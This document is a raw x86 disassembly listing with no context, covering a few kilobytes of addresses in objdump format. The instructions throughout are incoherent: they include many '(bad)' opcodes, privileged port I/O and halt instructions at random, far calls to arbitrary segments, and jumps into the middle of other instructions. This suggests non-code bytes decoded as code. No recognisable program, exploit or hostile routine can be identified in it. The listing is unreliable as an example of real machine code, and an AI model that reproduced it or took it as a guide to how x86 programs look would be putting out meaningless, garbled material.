  41883a:	mov    al,ds:0x91726d66
  41883f:	mov    DWORD PTR [eax-0x31],ecx
  418842:	fidivr DWORD PTR [edi+0x2b26ff57]
  418848:	mov    esi,0xbfb1a868
  41884d:	mov    edx,0xefec9e72
  418852:	pcmpeqb mm5,QWORD PTR [eax-0x7f]
  418856:	das    
  418857:	xchg   ecx,eax
  418858:	push   0xd
  41885a:	in     al,0xad
  41885c:	rcr    DWORD PTR [ecx+0x3e],cl
  41885f:	sub    BYTE PTR [ebx+ebx*2],al
  418862:	in     al,0x62
  418864:	imul   edx,DWORD PTR [esi-0x3a],0x809cd9ab
  41886b:	push   eax
  41886c:	inc    edx
  41886d:	add    BYTE PTR fs:[eax],al
	...
  4188d4:	add    BYTE PTR [eax],al
  4188d6:	xchg   esp,eax
  4188d7:	enter  0x4337,0x7f
  4188db:	push   esp
  4188dd:	fbld   TBYTE PTR [esi+0x2c9c3acd]
  4188e3:	call   0x8a8b019
  4188e8:	add    DWORD PTR [eax],eax
  4188ea:	add    BYTE PTR [ecx],al
  4188ec:	add    BYTE PTR [eax],al
  4188ee:	fimul  WORD PTR [ecx+0x4]
  4188f1:	ss fsub st,st(5)
  4188f4:	mov    esi,0xe41809e4
  4188f9:	sbb    eax,0x827fb0e
  4188fe:	jle    0x418964
  418900:	mov    ds:0xd72fa0ad,eax
  418905:	inc    ebp
  418906:	push   eax
  418907:	loope  0x418907
  418909:	xor    al,0xae
  41890b:	dec    ecx
  41890c:	in     eax,0x30
  41890e:	mov    ebp,0x6b936dc6
  418913:	lahf   
  418914:	xlat   BYTE PTR ds:[ebx]
  418915:	mov    ebp,0xdb62526d
  41891a:	mov    eax,ds:0xccd198e5
  41891f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418920:	jnp    0x41896c
  418922:	add    cl,0x6c
  418925:	push   ecx
  418926:	test   eax,0xc9621b37
  41892b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41892c:	inc    esp
  41892d:	mov    cl,0x47
  41892f:	add    ecx,DWORD PTR [ebp-0x9f0f0b3]
  418935:	out    0x87,eax
  418937:	iret   
  418938:	add    eax,0x442a7d5b
  41893d:	mov    cl,0xb1
  41893f:	stos   BYTE PTR es:[edi],al
  418940:	adc    DWORD PTR [ebx+edx*8-0x5087d6b6],ebx
  418947:	popa   
  418948:	jecxz  0x4189ad
  41894a:	loopne 0x418993
  41894c:	push   ds
  41894d:	jle    0x418960
  41894f:	push   ecx
  418950:	add    BYTE PTR [ecx+0x7c401d75],0x12
  418957:	js     0x418960
  418959:	lods   eax,DWORD PTR ds:[esi]
  41895a:	push   ecx
  41895b:	aaa    
  41895c:	pusha  
  41895d:	cmp    DWORD PTR [eax],eax
  41895f:	or     bl,BYTE PTR [ebp+0x5e]
  418962:	outs   dx,DWORD PTR ds:[esi]
  418963:	stos   BYTE PTR es:[edi],al
  418964:	out    0xd7,al
  418966:	push   ebx
  418967:	pop    es
  418968:	outs   dx,BYTE PTR ds:[esi]
  418969:	pop    ebx
  41896a:	aam    0x72
  41896c:	jno    0x41894d
  41896e:	mov    ebx,0x6e3b6ab3
  418973:	loope  0x4188f8
  418975:	pop    edx
  418976:	adc    DWORD PTR [esi-0x34],esp
  418979:	push   ebp
  41897a:	sti    
  41897b:	fnstenvw [ebp+0x3820b794]
  418982:	add    esi,esi
  418984:	pop    edx
  418985:	ins    DWORD PTR es:[edi],dx
  418986:	mov    al,ah
  418988:	add    al,0x1b
  41898a:	add    ah,dh
  41898c:	jne    0x41892b
  41898e:	popf   
  41898f:	hlt    
  418990:	icebp  
  418991:	xor    eax,0xcbe89a88
  418996:	xor    DWORD PTR [ebp+0x4a],esp
  418999:	(bad)  
  41899a:	sub    al,0x8c
  41899c:	adc    bl,al
  41899e:	inc    edi
  41899f:	shl    DWORD PTR [ecx+0xa],0x18
  4189a3:	adc    al,0x22
  4189a5:	push   esi
  4189a6:	call   0x40553a55
  4189ab:	jecxz  0x418943
  4189ad:	add    ecx,DWORD PTR [eax+0x396077e3]
  4189b3:	sbb    dl,cl
  4189b5:	in     al,dx
  4189b6:	push   cs
  4189b7:	or     BYTE PTR [esi+0x3c766206],0x15
  4189be:	popa   
  4189bf:	push   edi
  4189c0:	push   ss
  4189c1:	mov    ?,WORD PTR [ecx-0x4848f499]
  4189c7:	sbb    al,0xcb
  4189c9:	sub    BYTE PTR [ebx],0x92
  4189cc:	and    al,0xcc
  4189ce:	iret   
  4189cf:	mov    ds:0x79dc2338,al
  4189d4:	vpunpcklbw ymm4,ymm5,YMMWORD PTR [esi+0x35ace4a6]
  4189dc:	test   edi,edx
  4189de:	addr16 adc dh,0x39
  4189e2:	call   0xd0e6:0x8a570ab0
  4189e9:	in     eax,0x99
  4189eb:	sub    al,0xeb
  4189ed:	add    BYTE PTR gs:[eax],al
	...
  418a54:	add    BYTE PTR [eax],al
  418a56:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0x61377f69
  418a65:	into   
  418a66:	or     DWORD PTR [bx+di],eax
  418a69:	add    BYTE PTR [eax],al
  418a6b:	add    DWORD PTR [eax],eax
  418a6d:	add    BYTE PTR ds:0xa13bd2c0,cl
  418a73:	mov    dh,0x40
  418a75:	cmp    cl,BYTE PTR [ebx]
  418a77:	dec    esi
  418a78:	mov    bl,ah
  418a7a:	jle    0x418ab1
  418a7c:	stos   BYTE PTR es:[edi],al
  418a7d:	fwait
  418a7e:	out    0x99,al
  418a80:	call   0x12d7:0x44f23160
  418a87:	or     BYTE PTR [ecx-0x20],ch
  418a8a:	sar    BYTE PTR [esp+ecx*4],0x33
  418a8e:	mov    dl,cl
  418a90:	sub    eax,0xadd3d3e3
  418a95:	push   0xd03bb5d
  418a9a:	lea    esp,[ebx+0x4b]
  418a9d:	sub    eax,0x21fe5604
  418aa2:	adc    BYTE PTR [ebp+0x3b],bl
  418aa5:	sbb    DWORD PTR [ecx+ebp*1+0x228ed076],ecx
  418aac:	mov    ds:0xc1c56581,al
  418ab1:	das    
  418ab2:	repz mov eax,ds:0x3135c1ad
  418ab8:	dec    edi
  418ab9:	ret    0x9277
  418abc:	xchg   ebp,eax
  418abd:	mov    eax,0xdf49c23a
  418ac2:	push   ecx
  418ac3:	stos   BYTE PTR es:[edi],al
  418ac4:	and    bl,dh
  418ac6:	pop    ecx
  418ac7:	in     al,0xd4
  418ac9:	xor    al,0x31
  418acb:	je     0x418b1f
  418acd:	shr    DWORD PTR [edx],0x92
  418ad0:	lock cmp al,0xc9
  418ad3:	loop   0x418ac4
  418ad5:	sbb    al,al
  418ad7:	push   eax
  418ad8:	test   BYTE PTR [ebp+0xe068cba],0x9e
  418adf:	mov    BYTE PTR [edi+0x58],dl
  418ae2:	(bad)  
  418ae3:	scas   al,BYTE PTR es:[edi]
  418ae4:	es dec esp
  418ae6:	sar    edx,0xa9
  418ae9:	jp     0x418b49
  418aeb:	jne    0x418b4c
  418aed:	mov    ah,0xf7
  418aef:	dec    esp
  418af0:	dec    esi
  418af1:	dec    esp
  418af2:	sbb    dl,BYTE PTR ds:0xd8f2adf7
  418af8:	xor    esi,ecx
  418afa:	sar    edx,1
  418afc:	jae    0x418b1d
  418afe:	mov    cl,0xbb
  418b00:	fadd   QWORD PTR [edx-0x29]
  418b03:	push   ebp
  418b04:	mov    ecx,0x351290fc
  418b09:	aaa    
  418b0a:	sbb    ebp,DWORD PTR [eax-0x689954fd]
  418b10:	lock shl cl,1
  418b13:	repnz xor eax,DWORD PTR [ecx+0x6bf71a8e]
  418b1a:	(bad)  
  418b1b:	mov    bl,0x70
  418b1d:	mov    ah,0xbc
  418b1f:	rcl    BYTE PTR [edx],cl
  418b21:	push   edx
  418b22:	stc    
  418b23:	adc    DWORD PTR [edi],ebp
  418b25:	repz mov ebp,0x8e5663a1
  418b2b:	xor    al,0xbf
  418b2d:	adc    ah,BYTE PTR [edi+0x9dd8097]
  418b33:	mov    ecx,0x2700daaf
  418b38:	jno    0x418bb7
  418b3a:	sbb    BYTE PTR ds:0x971c47d6,dh
  418b40:	ror    BYTE PTR [ecx-0x34],0x8a
  418b44:	fldenv [ecx]
  418b46:	push   ecx
  418b47:	bound  ecx,QWORD PTR [ecx-0x17a4236f]
  418b4d:	fst    DWORD PTR ss:[eax]
  418b50:	or     DWORD PTR [esi],0xffffffa2
  418b53:	jecxz  0x418b8f
  418b55:	call   0x590b8dc4
  418b5a:	xchg   BYTE PTR ds:0x36918dd7,dl
  418b60:	pop    ebp
  418b61:	imul   eax,DWORD PTR [ebp-0x55],0xffffff91
  418b65:	jns    0x418b73
  418b67:	and    ecx,edi
  418b69:	enter  0x1593,0x59
  418b6d:	push   ecx
	...
  418bd6:	jl     0x418beb
  418bd8:	test   DWORD PTR [edx],esi
  418bda:	out    dx,eax
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0x12
  418be3:	les    edi,FWORD PTR [edi]
  418be5:	hlt    
  418be6:	or     al,BYTE PTR [bx+di]
  418be9:	add    BYTE PTR [eax],al
  418beb:	add    DWORD PTR [eax],eax
  418bed:	add    BYTE PTR [ecx+esi*4+0x7],ch
  418bf1:	mov    bh,0xef
  418bf3:	mov    ebp,0x1d03786d
  418bf8:	or     eax,ecx
  418bfa:	or     DWORD PTR [edi+0x5],edx
  418bfd:	mov    cl,0xea
  418bff:	ret    0xc071
  418c02:	jge    0x418c1a
  418c04:	pop    ebp
  418c05:	hlt    
  418c06:	push   ds
  418c07:	cmp    al,bl
  418c09:	mov    dh,0xb9
  418c0b:	test   eax,0x91a82b99
  418c10:	or     al,0x75
  418c12:	out    dx,al
  418c13:	fist   DWORD PTR [ebx]
  418c15:	and    dh,al
  418c17:	mov    bh,0xc0
  418c19:	fdivr  DWORD PTR ds:0x8a5faebe
  418c1f:	sbb    DWORD PTR [esi+0x31c47f19],esp
  418c25:	cmp    esi,ebp
  418c27:	dec    esp
  418c28:	sti    
  418c29:	xchg   esp,eax
  418c2a:	sub    BYTE PTR [eax],cl
  418c2c:	xchg   ebp,eax
  418c2d:	sbb    ebp,DWORD PTR [esi-0x4f543e18]
  418c33:	mov    ch,0x5e
  418c35:	jmp    0x418c11
  418c37:	sbb    al,0x8e
  418c39:	pop    edx
  418c3a:	outs   dx,DWORD PTR ds:[esi]
  418c3b:	dec    ebx
  418c3c:	inc    esp
  418c3d:	fucomip st,st(0)
  418c3f:	push   esi
  418c40:	fimul  DWORD PTR [esi]
  418c42:	push   ds
  418c43:	ja     0x418c8d
  418c45:	loopne 0x418c2c
  418c47:	pop    ebp
  418c48:	dec    edi
  418c49:	and    BYTE PTR [edi-0x73],dl
  418c4c:	xchg   eax,edx
  418c4e:	cmc    
  418c4f:	push   ebp
  418c50:	loope  0x418bda
  418c52:	jmp    0x48eb:0x18a8ea01
  418c59:	pop    ds
  418c5a:	dec    ebx
  418c5b:	scas   al,BYTE PTR es:[edi]
  418c5c:	(bad)  
  418c5d:	mov    ebx,0xa896966b
  418c62:	das    
  418c63:	out    dx,eax
  418c64:	(bad)  
  418c65:	add    al,0x84
  418c67:	adc    BYTE PTR [edx+0x1],dh
  418c6a:	or     al,0x7c
  418c6c:	adc    esp,DWORD PTR [esi]
  418c6e:	pusha  
  418c6f:	inc    ebx
  418c70:	push   eax
  418c71:	cmp    ebx,DWORD PTR [edx]
  418c73:	xchg   ebx,eax
  418c74:	imul   eax,esp,0xf542e0ea
  418c7a:	clc    
  418c7b:	dec    eax
  418c7c:	loop   0x418cb2
  418c7e:	in     al,dx
  418c7f:	jg     0x418c03
  418c81:	int    0x59
  418c83:	or     al,0xd1
  418c85:	adc    eax,0x7a5105aa
  418c8a:	adc    esp,DWORD PTR [edx]
  418c8c:	xchg   edi,eax
  418c8d:	inc    eax
  418c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c8f:	xor    al,0x65
  418c91:	das    
  418c92:	add    al,BYTE PTR [edx+0x2bcdd6b2]
  418c98:	xor    al,0x3a
  418c9a:	call   0xcce5136d
  418c9f:	adc    BYTE PTR [eax+0x5f],dl
  418ca2:	js     0x418cfd
  418ca4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ca5:	ret    0x3906
  418ca8:	pop    es
  418ca9:	fcom   QWORD PTR [ecx-0x72]
  418cac:	add    eax,0x65d3d3d7
  418cb1:	or     BYTE PTR [ebx-0x4a0711a4],al
  418cb7:	(bad)  
  418cb8:	or     dl,ah
  418cba:	cld    
  418cbb:	push   ebp
  418cbc:	mov    al,0x34
  418cbe:	test   al,0x3c
  418cc0:	push   eax
  418cc1:	in     al,0x70
  418cc3:	xor    eax,0x3c87b8e5
  418cc8:	and    al,0xf5
  418cca:	neg    BYTE PTR [edi]
  418ccc:	xchg   esp,eax
  418ccd:	lahf   
  418cce:	cmp    DWORD PTR [edi],0xccb29962
  418cd4:	jl     0x418c66
  418cd6:	icebp  
  418cd7:	sbb    al,ch
  418cd9:	push   esp
  418cda:	mov    ds:0xef6c9628,eax
  418cdf:	jge    0x418ce2
  418ce1:	pop    ss
  418ce2:	sahf   
  418ce3:	(bad)  
  418ce4:	jno    0x418d28
  418ce6:	mov    dh,0x38
  418ce8:	into   
  418ce9:	mov    ecx,ebp
  418ceb:	mov    ch,0xe7
  418ced:	lock add BYTE PTR [eax],al
	...
  418d54:	add    BYTE PTR [eax],al
  418d56:	sti    
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	rol    BYTE PTR [ecx],cl
  418d63:	and    edi,edi
  418d65:	sbb    eax,0x10b67
  418d6a:	add    BYTE PTR [ecx],al
  418d6c:	add    BYTE PTR [eax],al
  418d6e:	add    esp,DWORD PTR [ecx+0x5d]
  418d71:	xchg   ecx,eax
  418d72:	ins    BYTE PTR es:[edi],dx
  418d73:	out    dx,eax
  418d74:	jo     0x418d80
  418d76:	adc    BYTE PTR [edi+eiz*1],dl
  418d79:	mov    esi,0x6f159eb8
  418d7e:	inc    esp
  418d7f:	stc    
  418d80:	mov    BYTE PTR [esi+0x6b],bl
  418d83:	mov    cl,0xc3
  418d85:	pop    es
  418d86:	and    edi,eax
  418d88:	jle    0x418d7f
  418d8a:	in     eax,dx
  418d8b:	repnz test eax,0x4914fbd3
  418d91:	mov    dl,0x12
  418d93:	fs aaa 
  418d95:	std    
  418d96:	aaa    
  418d97:	lds    edx,FWORD PTR [ebx+0xf]
  418d9a:	xor    ebx,DWORD PTR [edx]
  418d9c:	nop
  418d9d:	cwde   
  418d9e:	pop    edx
  418d9f:	(bad)  
  418da0:	je     0x418d2b
  418da2:	add    eax,0x9bb02337
  418da7:	push   0x1e
  418da9:	int3   
  418daa:	xchg   ebx,eax
  418dab:	xchg   esi,eax
  418dac:	dec    eax
  418dad:	mov    esp,DWORD PTR [edx+0x574d6acf]
  418db3:	lahf   
  418db4:	(bad)  
  418db5:	xchg   edi,eax
  418db6:	add    DWORD PTR [edi-0x59208bbe],ebx
  418dbc:	leave  
  418dbd:	iret   
  418dbe:	retf   0xb3c2
  418dc1:	mov    gs,esi
  418dc3:	stc    
  418dc4:	mov    dh,0x65
  418dc6:	scas   eax,DWORD PTR es:[edi]
  418dc7:	mov    ebx,0x4cafdc50
  418dcc:	retf   
  418dcd:	les    edx,FWORD PTR [ebp+edi*4+0x6a]
  418dd1:	lds    esp,FWORD PTR [eax-0x222b76ca]
  418dd7:	mov    al,ds:0x6419e11f
  418ddc:	pop    ebx
  418ddd:	das    
  418dde:	push   0xffffffc9
  418de0:	(bad)  
  418de2:	dec    eax
  418de3:	clc    
  418de4:	aaa    
  418de5:	sbb    edx,edi
  418de7:	xchg   BYTE PTR [ebp+0x27c8e959],al
  418ded:	call   0x80b5:0xc72c8747
  418df4:	outs   dx,DWORD PTR ds:[esi]
  418df5:	nop
  418df6:	loope  0x418d9f
  418df8:	ret    0x7d6f
  418dfb:	jmp    0x51ccf31b
  418e00:	push   esi
  418e01:	(bad)  
  418e02:	in     al,dx
  418e03:	and    al,0x9b
  418e05:	cmc    
  418e06:	mov    edi,edi
  418e08:	cmp    DWORD PTR [esi-0x13],esi
  418e0b:	xor    BYTE PTR [edx+0x480c30b9],ah
  418e11:	das    
  418e12:	ret    0x6060
  418e15:	fs out 0x34,eax
  418e18:	cwde   
  418e19:	lods   eax,DWORD PTR ds:[esi]
  418e1a:	popa   
  418e1b:	and    esi,edi
  418e1d:	pop    edx
  418e1e:	stos   BYTE PTR es:[edi],al
  418e1f:	or     esp,DWORD PTR [ecx+0xe]
  418e22:	cmp    al,BYTE PTR [ebx]
  418e24:	fadd   DWORD PTR [ebp-0x5b]
  418e27:	jle    0x418e6f
  418e29:	dec    ecx
  418e2a:	sub    DWORD PTR [ebp+0x3c4a2905],ebx
  418e30:	jbe    0x418dee
  418e32:	shr    DWORD PTR [edx+0x480ac48e],cl
  418e38:	repz inc eax
  418e3a:	push   ds
  418e3b:	xchg   edx,eax
  418e3c:	call   0xb5f10e2a
  418e41:	imul   ecx,DWORD PTR [ebx+ebp*8-0x21],0xe7169f93
  418e49:	or     bl,BYTE PTR [edi+0x4c88c2ff]
  418e4f:	adc    BYTE PTR [ebx-0x4566551f],ch
  418e55:	in     eax,0xeb
  418e57:	aam    0xc
  418e59:	mov    WORD PTR [eax],ds
  418e5b:	mov    bl,BYTE PTR gs:[esi-0x55]
  418e5f:	call   0x8ad14ab5
  418e64:	or     BYTE PTR [ebx],0x41
  418e67:	jmp    FWORD PTR [edi]
  418e69:	call   0x0:0x3bf7bd95
	...
  418ed4:	add    BYTE PTR [eax],al
  418ed6:	push   cs
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx-0x55]
  418ee3:	or     eax,0xc675d82
  418ee8:	add    DWORD PTR [eax],eax
  418eea:	add    BYTE PTR [ecx],al
  418eec:	add    BYTE PTR [eax],al
  418eee:	mov    esi,0x8be386b4
  418ef3:	jo     0x418ec3
  418ef5:	adc    ebx,ebp
  418ef7:	sub    ecx,DWORD PTR [ebx+eiz*1]
  418efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418efb:	adc    bh,ah
  418efd:	shl    BYTE PTR [eax+0x70b38ee5],cl
  418f03:	and    DWORD PTR [ecx-0x2aeb02f8],esi
  418f09:	mov    fs,edi
  418f0b:	ret    
  418f0c:	in     al,0xed
  418f0e:	das    
  418f0f:	in     eax,0x4b
  418f11:	pop    ebp
  418f12:	icebp  
  418f13:	inc    ebp
  418f14:	xchg   edx,edi
  418f16:	das    
  418f17:	repz fwait
  418f19:	shr    BYTE PTR [edx],1
  418f1b:	jecxz  0x418f00
  418f1d:	popf   
  418f1e:	push   ebp
  418f1f:	rcl    esp,cl
  418f21:	or     DWORD PTR [ebx],edi
  418f23:	jp     0x418f80
  418f25:	cdq    
  418f26:	(bad)  
  418f28:	xchg   esi,eax
  418f29:	jo     0x418f71
  418f2b:	sub    edx,eax
  418f2d:	sub    esi,ebx
  418f2f:	dec    esi
  418f30:	retf   
  418f31:	pushf  
  418f32:	loop   0x418fb0
  418f34:	xor    eax,0x32cc2103
  418f39:	push   cs
  418f3a:	mov    WORD PTR [ecx],fs
  418f3c:	or     bl,al
  418f3e:	mov    ah,0xbc
  418f40:	jae    0x418f26
  418f42:	in     eax,0x65
  418f44:	jecxz  0x418f01
  418f46:	(bad)
  418f49:	ret    
  418f4a:	in     eax,dx
  418f4b:	mov    edx,0x66311955
  418f50:	lahf   
  418f51:	pop    ss
  418f52:	pop    ebp
  418f53:	inc    ebx
  418f54:	or     eax,0x14abf0c9
  418f59:	jno    0x418edf
  418f5b:	sahf   
  418f5c:	mov    bh,0x21
  418f5e:	mov    ds:0x6c010b5,al
  418f63:	pop    ds
  418f64:	out    0x6d,eax
  418f66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f68:	and    eax,0xd221f349
  418f6d:	ins    BYTE PTR es:[edi],dx
  418f6e:	retf   0x8a0c
  418f71:	jle    0x418fa8
  418f73:	jno    0x418f81
  418f75:	xor    ebx,DWORD PTR [ebx]
  418f77:	imul   ebp,ebx,0x12
  418f7a:	nop
  418f7b:	inc    ebx
  418f7c:	and    BYTE PTR [edi],ah
  418f7e:	mov    ebx,edx
  418f80:	ins    DWORD PTR es:[edi],dx
  418f81:	xchg   esi,eax
  418f82:	das    
  418f83:	xchg   esi,eax
  418f84:	add    DWORD PTR [eax+0x4716c1a5],ebp
  418f8a:	xchg   edx,esi
  418f8c:	mov    bh,0x36
  418f8e:	adc    al,0x78
  418f90:	ret    
  418f91:	fsub   DWORD PTR [esi+0x2bc56709]
  418f97:	cmp    dl,BYTE PTR [esi+0x392c560d]
  418f9d:	add    ebx,DWORD PTR [esi+0x3d9518bd]
  418fa3:	adc    al,0xe1
  418fa5:	add    eax,0xc6a5d621
  418faa:	out    0x45,al
  418fac:	mov    esp,0xa574bcef
  418fb1:	mov    BYTE PTR [edi+0x6b],bh
  418fb4:	push   esi
  418fb5:	adc    ah,BYTE PTR ds:[ebp-0x63]
  418fb9:	add    al,al
  418fbb:	scas   eax,DWORD PTR es:[edi]
  418fbc:	mov    ebp,esi
  418fbe:	pop    eax
  418fbf:	icebp  
  418fc0:	icebp  
  418fc1:	(bad)  
  418fc2:	fdiv   DWORD PTR [ecx]
  418fc4:	sub    BYTE PTR [edi],dl
  418fc6:	mov    esp,0x9b1c5c71
  418fcb:	into   
  418fcc:	mov    al,ds:0xc488a784
  418fd1:	fadd   DWORD PTR [esi+0x69edce31]
  418fd7:	(bad)  
  418fd8:	test   al,0xa7
  418fda:	pop    ds
  418fdb:	retf   
  418fdc:	sbb    eax,0xecdeec90
  418fe1:	stc    
  418fe2:	adc    BYTE PTR [esi+0x5c315016],ah
  418fe8:	(bad)  
  418fe9:	jecxz  0x418f87
  418feb:	aaa    
  418fec:	xchg   ebp,eax
  418fed:	inc    DWORD PTR [eax]
	...
  419053:	add    BYTE PTR [eax],al
  419055:	add    BYTE PTR [edi+edx*4],bl
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx-0x56150e59]
  419063:	or     eax,0xd675166
  419068:	add    DWORD PTR [eax],eax
  41906a:	add    BYTE PTR [ecx],al
  41906c:	add    BYTE PTR [eax],al
  41906e:	sbb    BYTE PTR [eax-0x30],ch
  419071:	loop   0x419024
  419073:	push   0xf
  419075:	add    eax,0xc94a0c81
  41907a:	push   0x78630612
  41907f:	test   BYTE PTR [edx+0x37],dl
  419082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419083:	jbe    0x4190e2
  419085:	addr16 cld 
  419087:	(bad)  
  419088:	jge    0x41904c
  41908a:	jne    0x419079
  41908c:	mov    ss:0xbfe34871,al
  419092:	ja     0x4190ca
  419094:	dec    esi
  419095:	sbb    ecx,0x3ae5d077
  41909b:	mov    ds:0x25807429,al
  4190a0:	mov    bh,0xfe
  4190a2:	mov    ecx,0xb05a1120
  4190a7:	or     al,0x67
  4190a9:	mov    al,ds:0xdfc09c28
  4190ae:	fimul  DWORD PTR [ecx-0x693f40b1]
  4190b4:	and    DWORD PTR ss:[ebx],ebx
  4190b7:	lahf   
  4190b8:	jle    0x41908c
  4190ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190bb:	lds    ecx,FWORD PTR [ebp+0x78]
  4190be:	aas    
  4190bf:	adc    al,0x79
  4190c1:	imul   ebx,DWORD PTR [eax*1-0x15ba40e4],0x4c
  4190c9:	pop    esi
  4190ca:	sbb    bl,BYTE PTR [ebp+eax*8+0xf]
  4190ce:	jmp    0x419065
  4190d0:	imul   ebx,DWORD PTR [eax],0x3a
  4190d3:	adc    eax,0xf1fa6549
  4190d8:	push   ss
  4190d9:	pop    edi
  4190da:	xchg   ecx,eax
  4190db:	nop
  4190dc:	ret    
  4190dd:	mov    ah,BYTE PTR [ebx-0x5fd3a137]
  4190e3:	out    0xe5,eax
  4190e5:	mov    ds:0x23e5586c,al
  4190ea:	out    0x7e,eax
  4190ec:	enter  0xe187,0xd7
  4190f0:	cli    
  4190f1:	and    dl,BYTE PTR [ebx]
  4190f3:	xchg   ebp,eax
  4190f4:	mov    eax,0xbbbb90f7
  4190f9:	push   cs
  4190fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190fb:	cwde   
  4190fc:	scas   al,BYTE PTR es:[edi]
  4190fd:	test   DWORD PTR [edi-0x5447205b],edx
  419103:	(bad)  
  419104:	int    0x9f
  419106:	push   0xffffff9f
  419108:	pop    ebx
  419109:	lods   al,BYTE PTR ds:[esi]
  41910a:	call   0xe496:0x19c5a599
  419111:	jmp    0x73dda219
  419116:	xchg   edx,eax
  419117:	test   edx,ecx
  419119:	loopne 0x4190e2
  41911b:	retf   
  41911c:	push   ebp
  41911d:	jnp    0x4190e2
  41911f:	aam    0x66
  419121:	push   ecx
  419122:	loop   0x41915a
  419124:	mov    bl,0x39
  419126:	mov    al,0x6f
  419128:	sbb    ah,BYTE PTR [edi]
  41912a:	mov    ebp,0xf9026d20
  41912f:	sub    DWORD PTR [eax],esi
  419131:	into   
  419132:	sub    al,0x6
  419134:	aam    0x98
  419136:	gs mov ch,0x49
  419139:	adc    al,0xf6
  41913b:	mov    DWORD PTR [edx],esp
  41913d:	xchg   ebp,eax
  41913e:	inc    ebp
  41913f:	pop    edi
  419140:	push   ebp
  419141:	mov    ah,0x58
  419143:	add    eax,0x3d85d5da
  419148:	leave  
  419149:	add    al,0x4d
  41914b:	(bad)  
  41914c:	loope  0x419171
  41914e:	dec    eax
  41914f:	or     esp,DWORD PTR [ebp+0x53]
  419152:	push   0xee4a934a
  419157:	not    BYTE PTR [ecx-0x3b]
  41915a:	data16 (bad) 
  41915c:	jecxz  0x419117
  41915e:	push   ecx
  41915f:	jnp    0x41912f
  419161:	pop    ebp
  419162:	pop    esp
  419163:	push   cs
  419164:	(bad)  
  419165:	jne    0x4191a2
  419167:	and    BYTE PTR [ebx-0x73],bh
  41916a:	adc    ch,al
  41916c:	push   ds
  41916d:	dec    esi
	...
  4191d6:	scas   eax,DWORD PTR es:[edi]
  4191d7:	test   DWORD PTR [esi-0xa441be],ebx
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     dh,cl
  4191e3:	xchg   esp,eax
  4191e4:	mov    ebp,0x10e6731
  4191e9:	add    BYTE PTR [eax],al
  4191eb:	add    DWORD PTR [eax],eax
  4191ed:	add    al,bh
  4191ef:	nop
  4191f0:	adc    dl,cl
  4191f2:	mov    DWORD PTR [edi-0x51],edi
  4191f5:	stos   BYTE PTR es:[edi],al
  4191f6:	push   0xde1a5c59
  4191fb:	pop    ebp
  4191fc:	in     al,dx
  4191fd:	cmp    bl,bl
  4191ff:	cmp    ch,BYTE PTR [esi-0x53]
  419202:	mov    ch,0x19
  419204:	not    eax
  419206:	idiv   eax
  419208:	cmp    BYTE PTR [esi+0x133184b9],al
  41920e:	sbb    dh,BYTE PTR [edi+0x52]
  419211:	out    0x6c,al
  419213:	rcr    BYTE PTR [ebp+0x23],1
  419216:	sbb    BYTE PTR [edi+0x2b],bl
  419219:	sub    DWORD PTR [edx],ebx
  41921b:	cli    
  41921c:	into   
  41921d:	cwde   
  41921e:	adc    ecx,DWORD PTR [esi+0x1e]
  419221:	fmul   QWORD PTR [esp+edx*1+0x4df476c3]
  419228:	xchg   DWORD PTR ds:0xc589539e,eax
  41922e:	arpl   WORD PTR [edx],dx
  419230:	or     esi,ebp
  419232:	ret    
  419233:	in     al,0x68
  419235:	xor    DWORD PTR [ebx+0x52],0xffffffb7
  419239:	out    dx,al
  41923a:	mov    edi,0xe85f40a3
  41923f:	test   al,0x4f
  419241:	stc    
  419242:	cmp    al,0xf3
  419244:	add    eax,0x9d456bd8
  419249:	jne    0x419201
  41924b:	(bad)  
  41924c:	js     0x4191ff
  41924e:	cmp    al,0xff
  419250:	jg     0x419267
  419252:	adc    BYTE PTR [ebx+edx*2],dl
  419255:	lods   al,BYTE PTR ds:[esi]
  419256:	pop    ecx
  419257:	xchg   DWORD PTR [esp+ebx*4],esi
  41925a:	add    esp,DWORD PTR [ebx+0x25803537]
  419260:	nop
  419261:	sti    
  419262:	sbb    eax,0x8ed4f056
  419267:	mov    ah,0x98
  419269:	sbb    al,0xa
  41926b:	test   ebx,ebx
  41926d:	and    DWORD PTR [ebp+edi*1+0x554f77dd],edi
  419274:	xchg   esi,eax
  419275:	xor    esp,edi
  419277:	enter  0xc0aa,0x4e
  41927b:	inc    ebx
  41927c:	xchg   ebx,eax
  41927d:	mov    al,0x25
  41927f:	mov    eax,ds:0x2c1b4e67
  419284:	mov    ds:0xc84e59e6,eax
  419289:	sbb    dl,BYTE PTR [ecx+0x54]
  41928c:	ret    0x539e
  41928f:	outs   dx,BYTE PTR ds:[esi]
  419290:	mov    ebp,0xe5ec306f
  419295:	cmp    al,BYTE PTR [esi+0x67f58f1f]
  41929b:	pop    edi
  41929c:	xchg   DWORD PTR [ebp+0x71],eax
  41929f:	xchg   ebp,eax
  4192a0:	sti    
  4192a1:	(bad)  
  4192a2:	dec    edi
  4192a3:	out    dx,eax
  4192a4:	push   esi
  4192a5:	mov    edx,0xa2863a83
  4192aa:	push   ebx
  4192ab:	mov    eax,ds:0xbd12c6
  4192b0:	shl    DWORD PTR [edi-0xfceeff4],1
  4192b6:	adc    eax,0xcf8ce220
  4192bb:	and    eax,0xfa50d2c6
